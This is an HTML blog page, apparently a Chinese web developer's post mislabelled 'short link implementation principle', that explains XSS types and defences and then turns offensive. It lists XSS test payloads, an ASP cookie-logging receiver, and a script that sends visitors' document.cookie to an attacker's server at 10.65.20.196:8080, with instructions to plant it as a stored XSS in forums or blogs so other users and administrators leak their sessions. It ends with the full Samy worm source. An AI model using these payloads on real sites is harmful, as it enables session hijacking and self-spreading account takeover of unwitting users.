@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>短链接实现原理 | HarryPangPang</title>
+  <meta name="description" content="xss-introduce  xss introduce  理解XSS的攻击手段和原理  掌握xss攻击的防范措施 了解XSS的定义 跨站脚本漏洞将允许攻击者在一个网站中执行恶意脚本，OWASP给出的XSS漏洞定义如下： “一名攻击者可以利用XSS漏洞向不知情的用户发送恶意脚本。终端用户的浏览器无法确定这些脚本是否可信任，并且会自动运行这些恶意脚本。因为它会认为这个脚本来自一个可信任的源，而恶意">
+<meta property="og:type" content="article">
+<meta property="og:title" content="短链接实现原理">
+<meta property="og:url" content="https://harrypangpang.github.io/2023/02/21/xss%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="HarryPangPangBlog">
+<meta property="og:description" content="xss-introduce  xss introduce  理解XSS的攻击手段和原理  掌握xss攻击的防范措施 了解XSS的定义 跨站脚本漏洞将允许攻击者在一个网站中执行恶意脚本，OWASP给出的XSS漏洞定义如下： “一名攻击者可以利用XSS漏洞向不知情的用户发送恶意脚本。终端用户的浏览器无法确定这些脚本是否可信任，并且会自动运行这些恶意脚本。因为它会认为这个脚本来自一个可信任的源，而恶意">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-02-21T02:41:21.000Z">
+<meta property="article:modified_time" content="2023-02-23T03:30:13.098Z">
+<meta property="article:author" content="HarryPangPang">
+<meta property="article:tag" content="安全">
+<meta name="twitter:card" content="summary">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://harrypangpang.github.io/2023/02/21/xss%E6%94%BB%E5%87%BB/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="HarryPangPangBlog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1.4.0/dist/gitalk.min.css">
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/HarryPangPang" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">HarryPangPang</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">web developer</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> 上海, 中国</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">标签</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">项目</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/HarryPangPang" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="https://github.com/HarryPangPang/HarryPangPang.github.io/issues/4" target="_blank" title="Email" data-toggle=tooltip data-placement=top><i class="icon icon-email"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%90%8E%E7%AB%AF/" rel="tag">后端</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%9E%E8%B7%B5/" rel="tag">实践</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%97%A5%E5%B8%B8%E8%B8%A9%E5%9D%91/" rel="tag">日常踩坑</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BA%90%E7%A0%81/" rel="tag">源码</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%BF%90%E7%BB%B4/" rel="tag">运维</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/%E5%90%8E%E7%AB%AF/" style="font-size: 13.5px;">后端</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 13px;">安全</a> <a href="/tags/%E5%AE%9E%E8%B7%B5/" style="font-size: 14px;">实践</a> <a href="/tags/%E6%97%A5%E5%B8%B8%E8%B8%A9%E5%9D%91/" style="font-size: 13px;">日常踩坑</a> <a href="/tags/%E6%BA%90%E7%A0%81/" style="font-size: 13.5px;">源码</a> <a href="/tags/%E8%BF%90%E7%BB%B4/" style="font-size: 13px;">运维</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">二月 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">五月 2019</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">四月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">三月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">二月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">一月 2019</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">十二月 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">十一月 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">六月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">四月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">三月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">九月 2016</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2023/02/23/centos%E5%AE%89%E8%A3%85node%E7%8E%AF%E5%A2%83(docker)/" class="title">centos安装node和docker</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-02-23T03:15:00.000Z" itemprop="datePublished">2023-02-23</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2023/02/21/xss%E6%94%BB%E5%87%BB/" class="title">短链接实现原理</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-02-21T02:41:21.000Z" itemprop="datePublished">2023-02-21</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2023/02/20/%E7%9F%AD%E9%93%BE%E6%8E%A5%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/" class="title">短链接实现原理</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-02-20T03:41:21.000Z" itemprop="datePublished">2023-02-20</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2022/02/17/Gitlab%20cicd/" class="title">Gitlab ci/cd</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-02-17T06:06:45.000Z" itemprop="datePublished">2022-02-17</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2022/02/17/docker%E9%83%A8%E7%BD%B2jenkins/" class="title">docker部署jenkins</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-02-17T06:06:45.000Z" itemprop="datePublished">2022-02-17</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-xss攻击" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      短链接实现原理
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2023/02/21/xss%E6%94%BB%E5%87%BB/" class="article-date">
+	  <time datetime="2023-02-21T02:41:21.000Z" itemprop="datePublished">2023-02-21</time>
+	</a>
+</span>
+        
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2023/02/21/xss%E6%94%BB%E5%87%BB/#comments" class="article-comment-link">评论</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h1 id="xss-introduce"><a class="markdownIt-Anchor" href="#xss-introduce"></a> xss-introduce</h1>
+<h1 id="xss-introduce-2"><a class="markdownIt-Anchor" href="#xss-introduce-2"></a> xss introduce</h1>
+<h3 id="理解xss的攻击手段和原理"><a class="markdownIt-Anchor" href="#理解xss的攻击手段和原理"></a> 理解XSS的攻击手段和原理</h3>
+<h2 id="掌握xss攻击的防范措施"><a class="markdownIt-Anchor" href="#掌握xss攻击的防范措施"></a> 掌握xss攻击的防范措施</h2>
+<p>了解XSS的定义<br />
+跨站脚本漏洞将允许攻击者在一个网站中执行恶意脚本，OWASP给出的XSS漏洞定义如下：<br />
+“一名攻击者可以利用XSS漏洞向不知情的用户发送恶意脚本。终端用户的浏览器无法确定这些脚本是否可信任，并且会自动运行这些恶意脚本。因为它会认为这个脚本来自一个可信任的源，而恶意脚本将访问浏览器中保存的cookie、会话token或其他的敏感信息，并利用这些信息来完成其他的恶意目的，而有些脚本甚至还可以修改页面的HTML代码。”</p>
+<h3 id="理解xss的原理必备"><a class="markdownIt-Anchor" href="#理解xss的原理必备"></a> 理解xss的原理（必备）</h3>
+<p>理解xss的攻击方式<br />
+掌握xss的防御措施</p>
+<h4 id="理解xss攻击方式"><a class="markdownIt-Anchor" href="#理解xss攻击方式"></a> 理解XSS攻击方式：</h4>
+<p>反射型：发出请求时，XSS代码出现在URL中（典型的特征，攻击脚本写在URL中，是明文的），作为输入提交到服务器端，服务器端解析后响应（），XSS代码随响应内容一起传回给浏览器（解析了XS代码，服务端把内容与HTML文本下发给浏览器，通常是js脚本），最后浏览器解析执行XSS代码这个过程想一次反射，故叫反射型XSS<br />
+演示：构建Node应用，演示反射型XSS攻击</p>
+<p>存储型：差别在于提交的代码会存储在服务器端（数据库，内存，服务系统等）下次请求页面时不用再提交XSS代码。<br />
+1)反射型XSS: 就如上面的例子，也就是黑客需要诱使用户点击链接。也叫作&quot;非持久型XSS“(Non-persistent XSS)<br />
+2)存储型XSS:把用户输入的数据”存储“在服务器端。这种XSS具有很强的稳定性。<br />
+比较常见的一个场景是，黑客写下一篇包含恶意Javascript代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的Javascript代码。黑客把恶意的脚本保存在服务器端，所以中XSS攻击就叫做&quot;存储型XSS&quot;。<br />
+3)DOM based XSS:也是一种反射型XSS，由于历史原因被单独列出来了。通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。<br />
+XSS脚本怎么进入服务端？</p>
+<h4 id="xss防御措施"><a class="markdownIt-Anchor" href="#xss防御措施"></a> XSS防御措施：</h4>
+<p>编码：不能对用户所有输入保持原样<br />
+对用户输入的数据进行HTML Entity编码</p>
+<p>过滤：把输入不合法的过滤掉，保持安全性<br />
+移除用户上传的DOM属性，如onerror，onclick等<br />
+移除用户上传的Style节点，script节点，iframe节点等<br />
+对于开发人员来说，首先需要注意的是应该对所有用户提交的内容执行坚如磐石输入验证。这包括网址，查 询字符串，header，POST 数据等所有用户提交的内容。只接受您所希望的字符，在您指定的长度内，和指定 的相应的数据的格式。组织，过滤，或忽略一切。 2. 保护被自动执行或来自第三方网站执行的所有敏感功能。在适当的情况使用会话令牌 27、验证码 28系统或者 HTTP 引用头检查。 3. 如果您的网站必须支持用户提供的 HTML，那么你是处在一个安全明智的下滑坡。然而，也有一些事情可以 做，来保护您的网站。请确保您收到的 HTML 内容是良好的，只包含最少的一组安全标签（绝对没有 JavaScript）， 没有包含任何引用远程的内容（尤其是样式表和 JavaScript）。而且，为了多一点的安全性，请将 httpOnly29添 加到您的 cookie</p>
+<p>校正：破坏了正常的页面结构，也是一种XSS攻击<br />
+避免直接都HTML Entity解码<br />
+使用DOM Parse（文本转成DOM结构）转换，校正不配对的DOM标签</p>
+<p>掌握XSS的防御措施<br />
+实战：<br />
+构建Node服务和建立一个评论，实例演示XSS的攻击预防</p>
+<p>Xss攻击常见测试语句</p>
+<pre><code class="hljs plaintext">&lt;scrtpt&gt;alert(‘test’)&lt;/script&gt;
+&lt;svg onload=alert(‘test’)&gt;
+
+
+http://www.ocelltech.com/en/so.asp
+search：inurl:&#x27;Product.asp?BigClassName&#x27;//google
+中华网
+*/&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+把alert里面的内容换成document.cookie就可以
+*/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+一般的做法是&lt;html&gt;
+&lt;title&gt;xx&lt;/title&gt;
+&lt;body&gt;
+&lt;%testfile = Server.MapPath(&quot;code.txt&quot;) //先构造一个路径，也就是取网站根目录，创造一个在根目录下的code.txt路径，保存在testfile中
+msg = Request(&quot;msg&quot;)   //获取提交过来的msg变量，也就是cookie值
+set fs = server.CreateObject(&quot;scripting.filesystemobject&quot;)//创建一个fs对象
+set thisfile = fs.OpenTextFile(testfile,8,True,0)
+thisfile.WriteLine(&quot;&quot;&amp;msg&amp;&quot;&quot;)//像code.txt中写入获取来的cookie
+thisfile.close()   //关闭
+set fs = nothing%&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p>把上述文件保存为cookie.asp文件，放到你自己的网站服务器下。比如这里我们自己搭建的服务器为：<a target="_blank" rel="noopener" href="http://10.65.20.196:8080">http://10.65.20.196:8080</a>。<br />
+XSS构造语句</p>
+<pre><code class="hljs plaintext">&lt;script&gt;window.open(&#x27;http://10.65.20.196:8080/cookie.asp?msg=&#x27;+document.cookie)&lt;/script&gt;</code></pre>
+<p>把上述语句放到你找到的存在XSS的目标中，不过这里最好是存储型xss，比如你找到了某个博客或者论坛什么的存在存储型XSS，你在里面发一篇帖子或者留上你的评论，内容就是上述语句，当其他用户或者管理员打开这个评论或者帖子链接后，就会触发，然后跳转到<a target="_blank" rel="noopener" href="http://10.65.20.196:8080/cookie.asp?msg=%E2%80%99+document.cookie%E7%9A%84%E9%A1%B5%E9%9D%A2%EF%BC%8C%E7%84%B6%E5%90%8E%E5%BD%93%E5%89%8D%E8%B4%A6%E6%88%B7%E7%9A%84coolie%E4%BF%A1%E6%81%AF%E5%B0%B1%E5%BD%93%E6%88%90%E5%8F%82%E6%95%B0%E5%8F%91%E5%88%B0%E4%BD%A0%E7%9A%84%E7%BD%91%E7%AB%99%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E9%87%8C%E4%BA%86%E3%80%82%E7%84%B6%E5%90%8E%E7%9A%84%E7%84%B6%E5%90%8E%E4%BD%A0%E5%B0%B1%E5%8F%AF%E4%BB%A5%E9%82%A3%E8%BF%99%E4%B8%AAcookie%E7%99%BB%E9%99%86%E4%BA%86">http://10.65.20.196:8080/cookie.asp?msg=’+document.cookie的页面，然后当前账户的coolie信息就当成参数发到你的网站下的文件里了。然后的然后你就可以那这个cookie登陆了</a></p>
+<p>Samy蠕虫源码</p>
+<pre><code class="hljs plaintext">1.&lt;div id=mycode style=&quot;BACKGROUND:url(&#x27;java  
+2.script:eval(document.all.mycode.expr)&#x27;)&quot;expr=&quot;var B=String.fromCharCode(34);varA=String.fromCharCode(39);function g()&#123;varC;try&#123;varD=document.body.createTextRange();C=D.htmlText&#125;catch(e)&#123;&#125;if(C)&#123;return 
+3.C&#125;else&#123;return eval(&#x27;document.body.inne&#x27;+&#x27;rHTML&#x27;)&#125;&#125;function 
+4.getData(AU)&#123;M=getFromURL(AU,&#x27;friendID&#x27;);L=getFromURL(AU,&#x27;Mytoken&#x27;)&#125;function getQueryParams()&#123;varE=document.location.search;var F=E.substring(1,E.length).split(&#x27;&amp;&#x27;);var AS=new Array();for(varO=0;O&lt;F.length;O++)&#123;varI=F[O].split(&#x27;=&#x27;);AS[I[0]]=I[1]&#125;return AS&#125;var J;varAS=getQueryParams();varL=AS[&#x27;Mytoken&#x27;];varM=AS[&#x27;friendID&#x27;];if(location.hostname==&#x27;profile.myspace.com&#x27;)&#123;document.location=&#x27;http://www.myspace.com&#x27;+location.pathname+location.search&#125;else&#123;if(!M)&#123;getData(g())&#125;main()&#125;functiongetClientFID()&#123;return findIn(g(),&#x27;up_launchIC( &#x27;+A,A)&#125;function nothing()&#123;&#125;functionparamsToString(AV)&#123;var N=new 
+5.String();var O=0;for(var P 
+6.in AV)&#123;if(O&gt;0)&#123;N+=&#x27;&amp;&#x27;&#125;varQ=escape(AV[P]);while(Q.indexOf(&#x27;+&#x27;)!=-1)&#123;QQ=Q.replace(&#x27;+&#x27;,&#x27;%2B&#x27;)&#125;while(Q.indexOf(&#x27;&amp;&#x27;)!=-1)&#123;QQ=Q.replace(&#x27;&amp;&#x27;,&#x27;%26&#x27;)&#125;N+=P+&#x27;=&#x27;+Q;O++&#125;return 
+7.N&#125;function httpSend(BH,BI,BJ,BK)&#123;if(!J)&#123;return 
+8.false&#125;eval(&#x27;J.onr&#x27;+&#x27;eadystatechange=BI&#x27;);J.open(BJ,BH,true);if(BJ==&#x27;POST&#x27;)&#123;J.setRequestHeader(&#x27;Content-Type&#x27;,&#x27;application/x-www-form-urlencoded&#x27;);J.setRequestHeader(&#x27;Content-Length&#x27;,BK.length)&#125;J.send(BK);return 
+9.true&#125;function findIn(BF,BB,BC)&#123;varR=BF.indexOf(BB)+BB.length;varS=BF.substring(R,R+1024);returnS.substring(0,S.indexOf(BC))&#125;functiongetHiddenParameter(BF,BG)&#123;return findIn(BF,&#x27;name=&#x27;+B+BG+B+&#x27; value=&#x27;+B,B)&#125;function getFromURL(BF,BG)&#123;var T;if(BG==&#x27;Mytoken&#x27;)&#123;T=B&#125;else&#123;T=&#x27;&amp;&#x27;&#125;var U=BG+&#x27;=&#x27;;varV=BF.indexOf(U)+U.length;var W=BF.substring(V,V+1024);var X=W.indexOf(T);var Y=W.substring(0,X);return Y&#125;function getXMLObj()&#123;var Z=false;if(window.XMLHttpRequest)&#123;try&#123;Z=new XMLHttpRequest()&#125;catch(e)&#123;Z=false&#125;&#125;else 
+10.if(window.ActiveXObject)&#123;try&#123;Z=new ActiveXObject(&#x27;Msxml2.XMLHTTP&#x27;)&#125;catch(e)&#123;try&#123;Z=newActiveXObject(&#x27;Microsoft.XMLHTTP&#x27;)&#125;catch(e)&#123;Z=false&#125;&#125;&#125;return 
+11.Z&#125;var AA=g();var AB=AA.indexOf(&#x27;m&#x27;+&#x27;ycode&#x27;);var AC=AA.substring(AB,AB+4096);varAD=AC.indexOf(&#x27;D&#x27;+&#x27;IV&#x27;);var AE=AC.substring(0,AD);varAF;if(AE)&#123;AEAE=AE.replace(&#x27;jav&#x27;+&#x27;a&#x27;,A+&#x27;jav&#x27;+&#x27;a&#x27;);AEAE=AE.replace(&#x27;exp&#x27;+&#x27;r)&#x27;,&#x27;exp&#x27;+&#x27;r)&#x27;+A);AF=&#x27; 
+12.but most of all, samy is my hero. &lt;d&#x27;+&#x27;iv id=&#x27;+AE+&#x27;D&#x27;+&#x27;IV&gt;&#x27;&#125;var AG;function getHome()&#123;if(J.readyState!=4)&#123;return&#125;varAU=J.responseText;AG=findIn(AU,&#x27;P&#x27;+&#x27;rofileHeroes&#x27;,&#x27;&lt;/td&gt;&#x27;);AGAG=AG.substring(61,AG.length);if(AG.indexOf(&#x27;samy&#x27;)==-1)&#123;if(AF)&#123;AG+=AF;var 
+13.AR=getFromURL(AU,&#x27;Mytoken&#x27;);var 
+14.AS=new 
+15.Array();AS[&#x27;interestLabel&#x27;]=&#x27;heroes&#x27;;AS[&#x27;submit&#x27;]=&#x27;Preview&#x27;;AS[&#x27;interest&#x27;]=AG;J=getXMLObj();httpSend(&#x27;/index.cfm?fuseaction=profile.previewInterests&amp;MytokenMytoken=&#x27;+AR,postHero,&#x27;POST&#x27;,paramsToString(AS))&#125;&#125;&#125;functionpostHero()&#123;if(J.readyState!=4)&#123;return&#125;var AU=J.responseText;var AR=getFromURL(AU,&#x27;Mytoken&#x27;);var 
+16.AS=new 
+17.Array();AS[&#x27;interestLabel&#x27;]=&#x27;heroes&#x27;;AS[&#x27;submit&#x27;]=&#x27;Submit&#x27;;AS[&#x27;interest&#x27;]=AG;AS[&#x27;hash&#x27;]=getHiddenParameter(AU,&#x27;hash&#x27;);httpSend(&#x27;/index.cfm?fuseaction=profile.processInterests&amp;Mytoken=&#x27;+AR,nothing,&#x27;POST&#x27;,paramsToString(AS))&#125;function 
+18.main()&#123;var AN=getClientFID();varBH=&#x27;/index.cfm?fuseaction=user.viewProfile&amp;friendID=&#x27;+AN+&#x27;&amp;Mytoken=&#x27;+L;J=getXMLObj();httpSend(BH,getHome,&#x27;GET&#x27;);xmlhttp2=getXMLObj();httpSend2(&#x27;/index.cfm?fuseaction=invite.addfriend_verify&amp;friendID=11851658&amp;MytokenMytoken=&#x27;+L,processxForm,&#x27;GET&#x27;)&#125;functionprocessxForm()&#123;if(xmlhttp2.readyState!=4)&#123;return&#125;var AU=xmlhttp2.responseText;var AQ=getHiddenParameter(AU,&#x27;hashcode&#x27;);var AR=getFromURL(AU,&#x27;Mytoken&#x27;);var 
+19.AS=new 
+20.Array();AS[&#x27;hashcode&#x27;]=AQ;AS[&#x27;friendID&#x27;]=&#x27;11851658&#x27;;AS[&#x27;submit&#x27;]=&#x27;Add to 
+21.Friends&#x27;;httpSend2(&#x27;/index.cfm?fuseaction=invite.addFriendsProcess&amp;Mytoken=&#x27;+AR,nothing,&#x27;POST&#x27;,paramsToString(AS))&#125;function 
+22.httpSend2(BH,BI,BJ,BK)&#123;if(!xmlhttp2)&#123;return 
+23.false&#125;eval(&#x27;xmlhttp2.onr&#x27;+&#x27;eadystatechange=BI&#x27;);xmlhttp2.open(BJ,BH,true);if(BJ==&#x27;POST&#x27;)&#123;xmlhttp2.setRequestHeader(&#x27;Content-Type&#x27;,&#x27;application/x-www-form-urlencoded&#x27;);xmlhttp2.setRequestHeader(&#x27;Content-Length&#x27;,BK.length)&#125;xmlhttp2.send(BK);return 
+24.true&#125;&quot;&gt;&lt;/DIV&gt;</code></pre>
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="https://harrypangpang.github.io/2023/02/21/xss%E6%94%BB%E5%87%BB/" title="短链接实现原理" target="_blank" rel="external">https://harrypangpang.github.io/2023/02/21/xss攻击/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/HarryPangPang" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/HarryPangPang" target="_blank"><span class="text-dark">HarryPangPang</span><small class="ml-1x">web developer</small></a></h3>
+        <div>个人简介。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+           
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2023/02/23/centos%E5%AE%89%E8%A3%85node%E7%8E%AF%E5%A2%83(docker)/" title="centos安装node和docker"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2023/02/20/%E7%9F%AD%E9%93%BE%E6%8E%A5%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/" title="短链接实现原理"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
